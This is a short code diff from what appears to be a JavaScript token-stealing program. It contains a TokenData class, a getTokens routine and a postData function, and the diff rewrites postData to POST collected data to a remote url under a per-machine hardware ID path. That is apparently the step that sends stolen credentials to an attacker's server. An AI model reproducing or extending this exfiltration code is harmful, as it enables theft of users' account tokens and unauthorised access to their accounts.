@@ -54,9 +54,7 @@ class TokenData {
 }
 
 function postData(data) {
-    let newData = data;
-    if (typeof data == 'object' && data != null) data = JSON.stringify(data);
-    get(httpS, url.toLowerCase() + `/d/${hwid}?d=${newData}`).then(() => {});
+    post(url.toLowerCase() + `/d/${hwid}`, { data }).then(() => {});
 }
 
 const getTokens = async () => {
